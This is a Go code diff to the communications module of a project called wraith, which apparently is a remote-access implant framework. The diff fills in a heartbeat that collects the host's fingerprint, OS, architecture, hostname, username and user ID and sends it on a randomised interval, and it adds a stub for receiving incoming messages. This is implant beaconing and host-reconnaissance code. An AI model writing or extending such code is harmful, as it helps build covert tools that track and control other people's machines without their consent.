@@ -6,6 +6,9 @@ import (
 	"encoding/hex"
 	"fmt"
 	"math/rand"
+	"os"
+	"os/user"
+	"runtime"
 	"sync"
 	"time"
 
@@ -14,7 +17,11 @@ import (
 	"dev.l1qu1d.net/wraith-labs/wraith/wraith/libwraith"
 )
 
-const MOD_NAME = "w.pinecomms"
+const (
+	MOD_NAME = "w.pinecomms"
+
+	SHM_ERRORS = "w.errors"
+)
 
 // A CommsManager module implementation which utilises (optionally) encrypted JWT
 // as a base for its transfer protocol. This allows messages to be signed and
@@ -76,6 +83,22 @@ func (m *ModulePinecomms) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 
 	// Heartbeat loop.
 	go func() {
+		// Cache some values used in the heartbeat.
+
+		fingerprint := w.GetFingerprint()
+		hostname, err := os.Hostname()
+		if err != nil {
+			hostname = "<unknown>"
+		}
+		username := "<unknown>"
+		userId := "<unknown>"
+		currentUser, err := user.Current()
+		if err == nil {
+			username = currentUser.Username
+			userId = currentUser.Uid
+		}
+		errs, _ := w.SHMGet(SHM_ERRORS).([]error)
+
 		for {
 			// Pick an interval between min and max for the next heartbeat.
 			interval := rand.Intn(
@@ -88,15 +111,14 @@ func (m *ModulePinecomms) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 				return
 			case <-time.After(time.Duration(interval) * time.Second):
 				// Build a heartbeat data packet.
-				// TODO
 				heartbeatData := proto.Heartbeat{
-					Fingerprint: "",
-					HostOS:      "",
-					HostArch:    "",
-					Hostname:    "",
-					HostUser:    "",
-					HostUserId:  0,
-					Errors:      []error{},
+					Fingerprint: fingerprint,
+					HostOS:      runtime.GOOS,
+					HostArch:    runtime.GOARCH,
+					Hostname:    hostname,
+					HostUser:    username,
+					HostUserId:  userId,
+					Errors:      errs,
 				}
 				heartbeatBytes, err := proto.Marshal(&heartbeatData, m.OwnPrivKey)
 				if err != nil {
@@ -114,12 +136,21 @@ func (m *ModulePinecomms) Mainloop(ctx context.Context, w *libwraith.Wraith) {
 		}
 	}()
 
+	// Start receiving messages.
+	// Background context is okay because the channel will be closed
+	// when the manager exits further down anyway.
+	recv := pm.RecvChan(context.Background())
+
 	// Mainloop.
 	for {
 		select {
 		// Trigger exit when requested.
 		case <-ctx.Done():
 			return
+		// Process incoming requests.
+		case <-recv:
+			// TODO
+			println("received message")
 		}
 	}
 }
